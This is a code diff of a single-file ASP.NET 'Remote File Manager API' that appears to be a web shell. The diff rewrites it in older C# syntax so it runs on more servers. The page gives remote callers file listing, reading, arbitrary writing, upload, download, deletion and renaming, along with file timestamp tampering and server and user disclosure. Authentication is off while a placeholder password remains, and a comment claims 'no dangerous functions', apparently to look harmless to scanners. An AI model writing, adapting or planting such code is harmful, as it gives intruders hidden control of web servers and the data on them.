@@ -2,7 +2,6 @@
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Web.Script.Serialization" %>
 <%@ Import Namespace="System.Collections.Generic" %>
-<%@ Import Namespace="System.Security.AccessControl" %>
 <script runat="server">
     // Remote File Manager API - ASP.NET Version
     // Single file deployment, no dangerous functions
@@ -23,10 +22,11 @@
             return;
         }
 
-        string action = GetParam("action", "");
+        string action = GetParam("action");
+        if (action == null) action = "";
 
         // Return blank if no action provided
-        if (string.IsNullOrEmpty(action))
+        if (action == "")
         {
             Response.End();
             return;
@@ -34,18 +34,18 @@
 
         // Get password from request
         string password = "";
-        if (!string.IsNullOrEmpty(Request.Headers["X-Password"]))
+        if (Request.Headers["X-Password"] != null && Request.Headers["X-Password"] != "")
             password = Request.Headers["X-Password"];
-        else if (!string.IsNullOrEmpty(Request.Form["password"]))
+        else if (Request.Form["password"] != null && Request.Form["password"] != "")
             password = Request.Form["password"];
-        else if (!string.IsNullOrEmpty(Request.QueryString["password"]))
+        else if (Request.QueryString["password"] != null && Request.QueryString["password"] != "")
             password = Request.QueryString["password"];
 
         // Access token configuration
         string PASSWORD = "your_password_here";
 
         // Verify access token
-        if (!string.IsNullOrEmpty(PASSWORD) && PASSWORD != "your_password_here")
+        if (PASSWORD != "" && PASSWORD != "your_password_here")
         {
             if (password != PASSWORD)
             {
@@ -104,13 +104,13 @@
         }
     }
 
-    string GetParam(string key, string defaultValue = "")
+    string GetParam(string key)
     {
-        if (!string.IsNullOrEmpty(Request.QueryString[key]))
+        if (Request.QueryString[key] != null && Request.QueryString[key] != "")
             return Request.QueryString[key];
-        if (!string.IsNullOrEmpty(Request.Form[key]))
+        if (Request.Form[key] != null && Request.Form[key] != "")
             return Request.Form[key];
-        return defaultValue;
+        return null;
     }
 
     string GetDefaultDir()
@@ -120,9 +120,10 @@
 
     string SafePath(string path)
     {
+        if (path == null) path = "";
         path = path.Replace("../", "").Replace("..\\", "");
 
-        if (string.IsNullOrEmpty(path) || path == "/")
+        if (path == "" || path == "/")
             return GetDefaultDir();
 
         try
@@ -137,13 +138,11 @@
 
     void SendResponse(bool success, object data, string message)
     {
-        var result = new Dictionary<string, object>
-        {
-            { "success", success },
-            { "data", data },
-            { "message", message }
-        };
-        var serializer = new JavaScriptSerializer();
+        Dictionary<string, object> result = new Dictionary<string, object>();
+        result.Add("success", success);
+        result.Add("data", data);
+        result.Add("message", message);
+        JavaScriptSerializer serializer = new JavaScriptSerializer();
         Response.Write(serializer.Serialize(result));
         Response.End();
     }
@@ -151,8 +150,9 @@
     string FormatSize(long bytes)
     {
         if (bytes == 0) return "0 B";
-        string[] units = { "B", "KB", "MB", "GB", "TB" };
-        int i = (int)Math.Floor(Math.Log(bytes, 1024));
+        string[] units = new string[] { "B", "KB", "MB", "GB", "TB" };
+        int i = (int)Math.Floor(Math.Log(bytes) / Math.Log(1024));
+        if (i > 4) i = 4;
         return Math.Round(bytes / Math.Pow(1024, i), 2) + " " + units[i];
     }
 
@@ -161,10 +161,8 @@
         try
         {
             FileAttributes attr = File.GetAttributes(path);
-            string info = (attr & FileAttributes.Directory) != 0 ? "d" : "-";
-            info += "rwx"; // Owner
-            info += "r-x"; // Group
-            info += "r-x"; // Others
+            string info = ((attr & FileAttributes.Directory) != 0) ? "d" : "-";
+            info += "rwxr-xr-x";
             return info;
         }
         catch
@@ -175,7 +173,8 @@
 
     void ListDirectory()
     {
-        string path = SafePath(GetParam("path", "/"));
+        string pathParam = GetParam("path");
+        string path = SafePath(pathParam != null ? pathParam : "/");
 
         if (!Directory.Exists(path))
         {
@@ -183,63 +182,63 @@
             return;
         }
 
-        var items = new List<Dictionary<string, object>>();
+        List<Dictionary<string, object>> items = new List<Dictionary<string, object>>();
 
         // Add parent directory
-        if (path != Path.GetPathRoot(path))
+        string root = Path.GetPathRoot(path);
+        if (path != root)
         {
-            items.Add(new Dictionary<string, object>
-            {
-                { "name", ".." },
-                { "path", Path.GetDirectoryName(path) },
-                { "is_dir", true },
-                { "size", 0 },
-                { "size_formatted", "-" },
-                { "mtime", 0 },
-                { "perms", "drwxr-xr-x" },
-                { "readable", true },
-                { "writable", true }
-            });
+            Dictionary<string, object> parentItem = new Dictionary<string, object>();
+            parentItem.Add("name", "..");
+            parentItem.Add("path", Path.GetDirectoryName(path));
+            parentItem.Add("is_dir", true);
+            parentItem.Add("size", 0);
+            parentItem.Add("size_formatted", "-");
+            parentItem.Add("mtime", 0);
+            parentItem.Add("perms", "drwxr-xr-x");
+            parentItem.Add("readable", true);
+            parentItem.Add("writable", true);
+            items.Add(parentItem);
         }
 
         // Add directories
         try
         {
-            foreach (string dir in Directory.GetDirectories(path))
+            string[] dirs = Directory.GetDirectories(path);
+            for (int i = 0; i < dirs.Length; i++)
             {
-                var dirInfo = new DirectoryInfo(dir);
+                DirectoryInfo dirInfo = new DirectoryInfo(dirs[i]);
                 long mtime = (long)(dirInfo.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
-                items.Add(new Dictionary<string, object>
-                {
-                    { "name", dirInfo.Name },
-                    { "path", dirInfo.FullName },
-                    { "is_dir", true },
-                    { "size", 0 },
-                    { "size_formatted", "-" },
-                    { "mtime", mtime },
-                    { "perms", GetPermsString(dir) },
-                    { "readable", true },
-                    { "writable", true }
-                });
+                Dictionary<string, object> item = new Dictionary<string, object>();
+                item.Add("name", dirInfo.Name);
+                item.Add("path", dirInfo.FullName);
+                item.Add("is_dir", true);
+                item.Add("size", 0);
+                item.Add("size_formatted", "-");
+                item.Add("mtime", mtime);
+                item.Add("perms", GetPermsString(dirs[i]));
+                item.Add("readable", true);
+                item.Add("writable", true);
+                items.Add(item);
             }
 
             // Add files
-            foreach (string file in Directory.GetFiles(path))
+            string[] files = Directory.GetFiles(path);
+            for (int i = 0; i < files.Length; i++)
             {
-                var fileInfo = new FileInfo(file);
+                FileInfo fileInfo = new FileInfo(files[i]);
                 long mtime = (long)(fileInfo.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
-                items.Add(new Dictionary<string, object>
-                {
-                    { "name", fileInfo.Name },
-                    { "path", fileInfo.FullName },
-                    { "is_dir", false },
-                    { "size", fileInfo.Length },
-                    { "size_formatted", FormatSize(fileInfo.Length) },
-                    { "mtime", mtime },
-                    { "perms", GetPermsString(file) },
-                    { "readable", true },
-                    { "writable", !fileInfo.IsReadOnly }
-                });
+                Dictionary<string, object> item = new Dictionary<string, object>();
+                item.Add("name", fileInfo.Name);
+                item.Add("path", fileInfo.FullName);
+                item.Add("is_dir", false);
+                item.Add("size", fileInfo.Length);
+                item.Add("size_formatted", FormatSize(fileInfo.Length));
+                item.Add("mtime", mtime);
+                item.Add("perms", GetPermsString(files[i]));
+                item.Add("readable", true);
+                item.Add("writable", !fileInfo.IsReadOnly);
+                items.Add(item);
             }
         }
         catch (Exception ex)
@@ -248,17 +247,16 @@
             return;
         }
 
-        var data = new Dictionary<string, object>
-        {
-            { "path", path },
-            { "items", items }
-        };
+        Dictionary<string, object> data = new Dictionary<string, object>();
+        data.Add("path", path);
+        data.Add("items", items);
         SendResponse(true, data, "");
     }
 
     void ReadFile()
     {
-        string path = SafePath(GetParam("path", ""));
+        string pathParam = GetParam("path");
+        string path = SafePath(pathParam != null ? pathParam : "");
 
         if (!File.Exists(path))
         {
@@ -269,12 +267,10 @@
         try
         {
             string content = File.ReadAllText(path);
-            var data = new Dictionary<string, object>
-            {
-                { "path", path },
-                { "content", content },
-                { "size", content.Length }
-            };
+            Dictionary<string, object> data = new Dictionary<string, object>();
+            data.Add("path", path);
+            data.Add("content", content);
+            data.Add("size", content.Length);
             SendResponse(true, data, "");
         }
         catch
@@ -285,10 +281,12 @@
 
     void WriteFile()
     {
-        string path = GetParam("path", "");
-        string content = Request.Form["content"] ?? "";
+        string pathParam = GetParam("path");
+        string path = pathParam != null ? pathParam : "";
+        string content = Request.Form["content"];
+        if (content == null) content = "";
 
-        if (string.IsNullOrEmpty(path))
+        if (path == "")
         {
             SendResponse(false, null, "Path cannot be empty");
             return;
@@ -297,7 +295,8 @@
         try
         {
             File.WriteAllText(path, content);
-            var data = new Dictionary<string, object> { { "bytes", content.Length } };
+            Dictionary<string, object> data = new Dictionary<string, object>();
+            data.Add("bytes", content.Length);
             SendResponse(true, data, "Saved successfully");
         }
         catch
@@ -308,9 +307,10 @@
 
     void CreateDirectory()
     {
-        string path = GetParam("path", "");
+        string pathParam = GetParam("path");
+        string path = pathParam != null ? pathParam : "";
 
-        if (string.IsNullOrEmpty(path))
+        if (path == "")
         {
             SendResponse(false, null, "Path cannot be empty");
             return;
@@ -335,9 +335,10 @@
 
     void DeleteItem()
     {
-        string path = SafePath(GetParam("path", ""));
+        string pathParam = GetParam("path");
+        string path = SafePath(pathParam != null ? pathParam : "");
 
-        if (string.IsNullOrEmpty(path))
+        if (path == "")
         {
             SendResponse(false, null, "Path cannot be empty");
             return;
@@ -368,10 +369,12 @@
 
     void RenameItem()
     {
-        string oldPath = SafePath(GetParam("old_path", ""));
-        string newPath = GetParam("new_path", "");
+        string oldPathParam = GetParam("old_path");
+        string newPathParam = GetParam("new_path");
+        string oldPath = SafePath(oldPathParam != null ? oldPathParam : "");
+        string newPath = newPathParam != null ? newPathParam : "";
 
-        if (string.IsNullOrEmpty(oldPath) || string.IsNullOrEmpty(newPath))
+        if (oldPath == "" || newPath == "")
         {
             SendResponse(false, null, "Path cannot be empty");
             return;
@@ -402,7 +405,8 @@
 
     void UploadFile()
     {
-        string dir = SafePath(GetParam("dir", "/"));
+        string dirParam = GetParam("dir");
+        string dir = SafePath(dirParam != null ? dirParam : "/");
 
         if (Request.Files.Count == 0)
         {
@@ -412,10 +416,11 @@
 
         try
         {
-            var file = Request.Files[0];
+            HttpPostedFile file = Request.Files[0];
             string targetPath = Path.Combine(dir, Path.GetFileName(file.FileName));
             file.SaveAs(targetPath);
-            var data = new Dictionary<string, object> { { "path", targetPath } };
+            Dictionary<string, object> data = new Dictionary<string, object>();
+            data.Add("path", targetPath);
             SendResponse(true, data, "Uploaded successfully");
         }
         catch
@@ -426,7 +431,8 @@
 
     void DownloadFile()
     {
-        string path = SafePath(GetParam("path", ""));
+        string pathParam = GetParam("path");
+        string path = SafePath(pathParam != null ? pathParam : "");
 
         if (!File.Exists(path))
         {
@@ -445,13 +451,14 @@
 
     void TouchFile()
     {
-        string path = SafePath(GetParam("path", ""));
-        string timeStr = GetParam("time", "");
+        string pathParam = GetParam("path");
+        string path = SafePath(pathParam != null ? pathParam : "");
+        string timeStr = GetParam("time");
 
         try
         {
             DateTime newTime;
-            if (!string.IsNullOrEmpty(timeStr))
+            if (timeStr != null && timeStr != "")
             {
                 long timestamp = long.Parse(timeStr);
                 newTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(timestamp).ToLocalTime();
@@ -484,7 +491,8 @@
 
     void GetFileInfo()
     {
-        string path = SafePath(GetParam("path", ""));
+        string pathParam = GetParam("path");
+        string path = SafePath(pathParam != null ? pathParam : "");
 
         bool isDir = Directory.Exists(path);
         bool isFile = File.Exists(path);
@@ -502,7 +510,7 @@
 
             if (isFile)
             {
-                var fi = new FileInfo(path);
+                FileInfo fi = new FileInfo(path);
                 size = fi.Length;
                 mtime = (long)(fi.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                 ctime = (long)(fi.CreationTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
@@ -510,29 +518,27 @@
             }
             else
             {
-                var di = new DirectoryInfo(path);
+                DirectoryInfo di = new DirectoryInfo(path);
                 mtime = (long)(di.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                 ctime = (long)(di.CreationTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                 atime = (long)(di.LastAccessTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
             }
 
-            var data = new Dictionary<string, object>
-            {
-                { "path", path },
-                { "name", Path.GetFileName(path) },
-                { "is_dir", isDir },
-                { "size", size },
-                { "size_formatted", FormatSize(size) },
-                { "mtime", mtime },
-                { "ctime", ctime },
-                { "atime", atime },
-                { "perms", GetPermsString(path) },
-                { "perms_octal", "0755" },
-                { "readable", true },
-                { "writable", true },
-                { "owner", 0 },
-                { "group", 0 }
-            };
+            Dictionary<string, object> data = new Dictionary<string, object>();
+            data.Add("path", path);
+            data.Add("name", Path.GetFileName(path));
+            data.Add("is_dir", isDir);
+            data.Add("size", size);
+            data.Add("size_formatted", FormatSize(size));
+            data.Add("mtime", mtime);
+            data.Add("ctime", ctime);
+            data.Add("atime", atime);
+            data.Add("perms", GetPermsString(path));
+            data.Add("perms_octal", "0755");
+            data.Add("readable", true);
+            data.Add("writable", true);
+            data.Add("owner", 0);
+            data.Add("group", 0);
             SendResponse(true, data, "");
         }
         catch
@@ -544,23 +550,30 @@
     void GetServerInfo()
     {
         string currentUser = Environment.UserName;
+        long diskFree = 0;
+        long diskTotal = 0;
 
-        var driveInfo = new DriveInfo(Path.GetPathRoot(Request.PhysicalPath));
-        long diskFree = driveInfo.AvailableFreeSpace;
-        long diskTotal = driveInfo.TotalSize;
-
-        var data = new Dictionary<string, object>
+        try
         {
-            { "php_version", Environment.Version.ToString() },
-            { "server_software", Request.ServerVariables["SERVER_SOFTWARE"] ?? "IIS" },
-            { "document_root", Request.PhysicalApplicationPath },
-            { "script_path", Request.PhysicalPath },
-            { "upload_max", "30M" },
-            { "post_max", "30M" },
-            { "disk_free", FormatSize(diskFree) },
-            { "disk_total", FormatSize(diskTotal) },
-            { "current_user", currentUser }
-        };
+            DriveInfo driveInfo = new DriveInfo(Path.GetPathRoot(Request.PhysicalPath));
+            diskFree = driveInfo.AvailableFreeSpace;
+            diskTotal = driveInfo.TotalSize;
+        }
+        catch { }
+
+        string serverSoftware = Request.ServerVariables["SERVER_SOFTWARE"];
+        if (serverSoftware == null) serverSoftware = "IIS";
+
+        Dictionary<string, object> data = new Dictionary<string, object>();
+        data.Add("php_version", Environment.Version.ToString());
+        data.Add("server_software", serverSoftware);
+        data.Add("document_root", Request.PhysicalApplicationPath);
+        data.Add("script_path", Request.PhysicalPath);
+        data.Add("upload_max", "30M");
+        data.Add("post_max", "30M");
+        data.Add("disk_free", FormatSize(diskFree));
+        data.Add("disk_total", FormatSize(diskTotal));
+        data.Add("current_user", currentUser);
         SendResponse(true, data, "");
     }
 </script>
